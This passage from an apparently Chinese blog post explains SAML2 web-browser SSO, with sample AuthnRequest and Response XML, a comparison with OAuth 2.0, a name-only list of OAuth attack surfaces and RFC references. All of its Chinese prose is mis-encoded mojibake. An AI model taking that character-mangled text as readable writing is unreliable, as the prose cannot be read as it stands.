<li><strong>SAMLæ¦‚è¦æ–‡ä»¶</strong>ä»¥æ»¡è¶³ç‰¹å®šçš„ä¸šåŠ¡ç”¨ä¾‹ï¼Œä¾‹å¦‚Web Browser SSOé…ç½®æ–‡ä»¶ã€‚æ¦‚è¦æ–‡ä»¶é€šå¸¸åœ¨SAMLæ–­è¨€ã€åè®®å’Œç»‘å®šçš„å†…å®¹ä¸Šå®šä¹‰çº¦æŸï¼Œå…¶å®šä¹‰äº†ä¸‰è€…å¦‚ä½•ç›¸äº’åä½œä»¥ä¾¿å¯ä»¥äº’æ“ä½œçš„æ–¹å¼è§£å†³ä¸šåŠ¡ç”¨ä¾‹ï¼ŒåŒ…æ‹¬Web Browser SSO Profileï¼Œidentity Provider Discovery Profileï¼ŒSingle Logout Profileç­‰</li>
<li><strong>å…ƒæ•°æ®</strong>æ˜¯SAMLä¸ªæ„å»ºå—ä¹‹é—´ä¸€äº›å…±æœ‰çš„é…ç½®æ•°æ®ï¼Œå¦‚ï¼šå¯†é’¥ï¼Œèº«ä»½å±æ€§ã€å®ä½“æ”¯æŒçš„ç»‘å®šæ–¹å¼ç­‰</li>
<li><strong>è®¤è¯ä¸Šä¸‹æ–‡</strong> æŸäº›æƒ…å¢ƒä¸‹SPå¯èƒ½ä¼šéœ€è¦ç”¨æˆ·åœ¨IDPè¿›è¡Œè®¤è¯æ—¶æ‰€ç”¨çš„è®¤è¯æ–¹å¼ä»¥åŠå¼ºåº¦ç­‰ç¯å¢ƒä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä¾¿æ˜¯SPçš„è®¤è¯ä¸Šä¸‹æ–‡ã€‚SPå¯ä»¥ä»æ–­è¨€æ¶ˆæ¯çš„authentication statementèŠ‚ç‚¹ä¸­è·å–è¿™äº›ä¿¡æ¯ã€‚å½“ç„¶ï¼ŒIDPå¯èƒ½ä¹Ÿéœ€è¦ä¸€äº›ç±»ä¼¼çš„ç¯å¢ƒä¿¡æ¯ï¼Œå…¶ä¹Ÿå¯ä»¥ä»SAMLçš„Requestä¸­è·å–åˆ°å®ƒä»¬ã€‚</li>
<li><strong>ä¸»ä½“ç¡®è®¤</strong> å¸®åŠ©ä¾èµ–æ–¹ç¡®è®¤æ–­è¨€å“åº”çš„ä¸»ä½“ä¸ä¾èµ–æ–¹æ­£åœ¨è¯·æ±‚çš„ä¸»ä½“æ˜¯ä¸€è‡´çš„ã€‚SAML2ä¸­å®šä¹‰äº†ä¸‰ç§æ¨¡å¼<ul>
<li>urn:oasis:names:tc:SAML:2.0:cm:holder-of-key  # é€šè¿‡å¯†é’¥æ ‡è¯† ä¾èµ–æ–¹éœ€è¦å£°æ˜ä¸å¯†é’¥çš„å…³ç³»</li>
<li>urn:oasis:names:tc:SAML:2.0:cm:sender-vouches  # ç”±å‘é€æ–¹æŒ‡å®šæ–­è¨€ç”±è°å¤„ç†</li>
<li>urn:oasis:names:tc:SAML:2.0:cm:bearer  # ä¾èµ–æ–¹éœ€è¦é‡‡å–ä¸€äº›ç­–ç•¥æ¥åˆ¤æ–­æ˜¯å¦å…·æœ‰å¯¹è¯¥æ–­è¨€çš„å¤„ç†æƒé™</li>
</ul>
</li>
</ul>
<p>SAMLæœ‰å¤šç§åº”ç”¨åœºæ™¯ï¼Œå…¶ä¸­æ¯”è¾ƒå…¸å‹çš„ä¸¤ç§åˆ†åˆ«æ—¶Web Browser SSO ä»¥åŠIdentity Federationã€‚ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªé€šè¿‡SAMLæ¥è¿›è¡ŒWeb Browser SSOç™»å½•çš„ä¾‹å­æ¥è¯´æ˜ä¸€äº›æ•°æ®ç»“æ„ä»¥åŠé€šè¿‡SAMLæ¥è¿›è¡ŒWeb Browser SSOç™»å½•çš„æµç¨‹ï¼Œæ ¹æ®å…¥å£ä¸åŒSAMlåˆæœ‰ä¸¤ç§ä¸åŒçš„æ¶ˆæ¯æµè½¬æ–¹å¼ï¼Œåˆ†åˆ«ä¸ºSP-Initiatedä»¥åŠIDP-Initiatedï¼ˆqaxçš„é›¶ä¿¡ä»»ï¼Œcyçš„404é€šè¡Œè¯ï¼‰ï¼Œå…¶ä¸­åˆä»¥SP-Initiatedåœ¨ä½¿ç”¨ä¸­æœ€ä¸ºå¸¸è§ã€‚æˆ‘ä»¬å°†ä»¥SP-Initiatedçš„æ–¹å¼è¿›è¡Œè¯´æ˜ã€‚</p>
<p>å½“ç”¨æˆ·è®¿é—®æŸä¸€ä¸ªåº”ç”¨ï¼ˆSPï¼‰æ—¶ï¼Œå› ä¸ºå°šæœªå–å¾—è®¤è¯ä¸æˆæƒï¼Œæ­¤æ—¶SPä¼šå°†è¯·æ±‚é‡å®šå‘åˆ°IDPå¹¶æºå¸¦SAML Requestä¿¡æ¯æ¥è¯·æ±‚IDPå¯¹ç”¨æˆ·èº«ä»½è¿›è¡Œè®¤è¯ã€‚</p>
<p>SAML Requestä¿¡æ¯æ˜¯ä¸€æ®µè¢«Base64ç¼–ç çš„XMLæ•°æ®ï¼Œè§£ç åç±»ä¼¼å¦‚ä¸‹çš„æ ¼å¼ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">samlp:AuthnRequest</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:samlp</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:saml</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">ID</span>=<span class="string">&quot;identifier_1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">Version</span>=<span class="string">&quot;2.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">IssueInstant</span>=<span class="string">&quot;2004-12-05T09:21:59Z&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">AssertionConsumerServiceIndex</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">saml:Issuer</span>&gt;</span>https://sp.example.com/SAML2<span class="tag">&lt;/<span class="name">saml:Issuer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">samlp:NameIDPolicy</span></span></span><br><span class="line"><span class="tag"><span class="attr">AllowCreate</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">Format</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">samlp:AuthnRequest</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“IDPæ¥å—åˆ°è¯¥è¯·æ±‚åä¼šå“åº”ç»™ç”¨æˆ·ä¸€ä¸ªç™»å½•é¡µé¢è®©ç”¨æˆ·è¾“å…¥èº«ä»½å‡­æ®ä»¥éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œç”¨æˆ·èº«ä»½éªŒè¯å®ŒæˆåIDPå°†å“åº”ç»™æµè§ˆå™¨ä¸€ä¸ªå¸¦è‡ªæäº¤jsè„šæœ¬çš„é¡µé¢å°†ç”¨æˆ·èº«ä»½æ–­è¨€å‘é€ç»™SPï¼Œè¯¥æ–­è¨€ç»è¿‡è§£ç åç±»ä¼¼å¦‚ä¸‹ç»“æ„ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">samlp:Response</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:samlp</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:saml</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">IssueInstant</span>=<span class="string">&quot;xxxxx&quot;</span> <span class="attr">Destination</span>=<span class="string">&quot;https://xxx.idp.com/saml/SSO&quot;</span> <span class="attr">InResponseTo</span>=<span class="string">&quot;xxxxx&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">saml:Issuer</span>&gt;</span>https://xxx.idp.cn<span class="tag">&lt;/<span class="name">saml:Issuer</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">samlp:Status</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">samlp:StatusCode</span> <span class="attr">Value</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">samlp:Status</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">saml:Assertion</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:saml</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">IssueInstant</span>=<span class="string">&quot;xxxxx&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:Issuer</span>&gt;</span>https://xxx.idp.cn<span class="tag">&lt;/<span class="name">saml:Issuer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ds:Signature</span></span></span><br><span class="line"><span class="tag">			<span class="attr">xmlns:ds</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ds:SignedInfo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:CanonicalizationMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:SignatureMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:Reference</span> <span class="attr">URI</span>=<span class="string">&quot;#xxxxxx&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ds:Transforms</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">ds:Transform</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;</span>/&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">ds:Transform</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">ds:Transforms</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ds:DigestMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ds:DigestValue</span>&gt;</span>/xxxxxxxx<span class="tag">&lt;/<span class="name">ds:DigestValue</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ds:Reference</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">ds:SignedInfo</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ds:SignatureValue</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="name">ds:SignatureValue</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ds:KeyInfo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:X509Data</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ds:X509Certificate</span>&gt;</span>xxxxxx<span class="tag">&lt;/<span class="name">ds:X509Certificate</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ds:X509Data</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">ds:KeyInfo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ds:Signature</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:Subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:NameID</span> <span class="attr">Format</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&quot;</span>&gt;</span>test@test.example.com<span class="tag">&lt;/<span class="name">saml:NameID</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:SubjectConfirmation</span> <span class="attr">Method</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:SubjectConfirmationData</span> <span class="attr">NotOnOrAfter</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">Recipient</span>=<span class="string">&quot;https://xxx.xxx.com/saml/SSO&quot;</span> <span class="attr">InResponseTo</span>=<span class="string">&quot;xxxxx&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:SubjectConfirmation</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:Subject</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:Conditions</span> <span class="attr">NotBefore</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">NotOnOrAfter</span>=<span class="string">&quot;xxxx&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:AudienceRestriction</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:Audience</span>&gt;</span>https://xxx.xxx.com/xxxxxx/saml/SSO<span class="tag">&lt;/<span class="name">saml:Audience</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:AudienceRestriction</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:Conditions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:AuthnStatement</span> <span class="attr">AuthnInstant</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">SessionIndex</span>=<span class="string">&quot;xxxxx&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:AuthnContext</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:AuthnContextClassRef</span>&gt;</span>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified<span class="tag">&lt;/<span class="name">saml:AuthnContextClassRef</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:AuthnContext</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:AuthnStatement</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:AttributeStatement</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span>xxxx@xxxx.cn</span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:AttributeValue</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span>xxxx@xxx.xx</span><br><span class="line">					<span class="tag">&lt;/<span class="name">saml:AttributeValue</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span>null</span><br><span class="line">					<span class="tag">&lt;/<span class="name">saml:AttributeValue</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:AttributeStatement</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:Assertion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">samlp:Response</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œæ•´ä½“æµç¨‹ä¸Šå’ŒOAuth 2.0éšå¼æ¨¡å¼å¹¶æ— å¤ªå¤§å·®å¼‚ï¼Œé™¤äº†SAML2ä½¿ç”¨äº†æ–­è¨€è¿™ä¸€æ•°æ®ç»“æ„æ¥ä¼ è¾“ç”¨æˆ·æ•°æ®å¤–ï¼Œå¦ä¸€å¤„å·®åˆ«ä¾¿æ˜¯åœ¨æ­¤æ¨¡å¼ä¸‹SAMLçš„SPä¸IDPæ˜¯ä¸ä¼šç›´æ¥è¿›è¡Œé€šä¿¡çš„ï¼Œè€Œåœ¨OAuth 2.0ä»¥åŠOIDCä¸­ï¼ŒClientså‡ä¼šå‘æˆæƒæœåŠ¡å™¨çš„tokenæˆ–è€…userinfoç­‰ç«¯ç‚¹è®¿é—®ä»¥è·å–ç”¨æˆ·ä¿¡æ¯ã€Tokenç­‰èµ„æ–™ï¼Œå¯¼è‡´è¯¥å·®åˆ«çš„åŸå› åªåœ¨äºä½¿ç”¨äº†form-bindçš„æ–¹å¼è¿›è¡Œäº¤äº’ï¼Œè‹¥ä½¿ç”¨artifact-bindçš„æ–¹å¼ä¾¿ä¸æˆæƒç æ¨¡å¼æ— å¼‚ã€‚</p>
<p>SAMLä¸ä»…å¯ä»¥è¢«å•ç‹¬ç”¨æˆ·SSOï¼Œå…¶ä¹Ÿå¯ä»¥åµŒå…¥åˆ°å…¶ä»–åè®®ä¸­ä½œä¸ºä¸€ç§æ•°æ®ç»“æ„æ¥è¿›è¡Œå®‰å…¨ä¿¡æ¯äº¤æ¢ï¼Œå¦‚åœ¨OAuth2.0ä¸­é€šè¿‡Code å»è·å–Access Tokenæ—¶ä¾¿å¯é‡‡ç”¨SAMLçš„æ–¹å¼äº¤æ¢æ•°æ® <a href="https://www.rfc-editor.org/rfc/rfc7522#/">RFC7522</a>ã€‚</p>
<h1 id="å¸¸è§æ”»å‡»é¢"><a href="#å¸¸è§æ”»å‡»é¢" class="headerlink" title="å¸¸è§æ”»å‡»é¢"></a>å¸¸è§æ”»å‡»é¢</h1><p>OAuth2.0è§„èŒƒä¸­æåŠäº†ä»¥ä¸‹çš„æ”»å‡»æ‰‹æ³•ï¼š</p>
<ul>
<li>å‡­æ®çŒœæµ‹æ”»å‡»</li>
<li>é’“é±¼æ”»å‡»</li>
<li>è·¨ç«™è¯·æ±‚ä¼ªé€ </li>
<li>ç‚¹å‡»åŠ«æŒ</li>
<li>ä»£ç æ³¨å…¥</li>
<li>è®¿é—®ä»¤ç‰Œæ»¥ç”¨ï¼šéšå¼æµ+å…¬å…±å®¢æˆ·ç«¯</li>
<li>å¼€æ”¾é‡å®šå‘</li>
</ul>
<p>é™¤äº†è§„èŒƒä¸­æåŠçš„æ”»å‡»æ‰‹æ³•ï¼Œå®è·µä¸­å› ä¸ºè§„èŒƒçš„å®ç°å·®å¼‚ä»¥åŠä¸€äº›å…¶ä»–çš„æŠ€æœ¯é—®é¢˜OAuthåœ¨ä»¥ä¸‹æ–¹é¢ä¹Ÿå­˜åœ¨è–„å¼±é¢</p>
<ul>
<li>Access TokenéªŒè¯å¤±è´¥</li>
<li>å¼€æ”¾å®¢æˆ·ç«¯æ³¨å†Œ</li>
<li>å®¢æˆ·ç«¯è®¤è¯ç¼ºå¤±</li>
<li>å‡­æ®æ³„éœ²</li>
<li>.well-knownæ¥å£è¿‡åº¦ä¿¡æ¯æ³„éœ²</li>
</ul>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul>
<li><a href="https://datatracker.ietf.org/doc/html/rfc6749#/">RFC6749</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc7522#/">RFC7522</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc7521#/">RFC7521</a></li>
<li><a href="https://openid.net/specs/openid-connect-core-1_0.html#/">OpenID Connect Core 1.0 incorporating errata set 2</a></li>
<li><a href="https://docs.authing.co/v2/concepts/">https://docs.authing.co/v2/concepts/</a></li>
<li><a href="https://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html#/">https://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html#/</a></li>
</ul>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>å•ç‚¹ç™»å½•</tag>
        <tag>SSO</tag>
        <tag>OAuth</tag>
        <tag>CAS</tag>
        <tag>OIDC</tag>
        <tag>SAML2</tag>
      </tags>
  </entry>
</search>
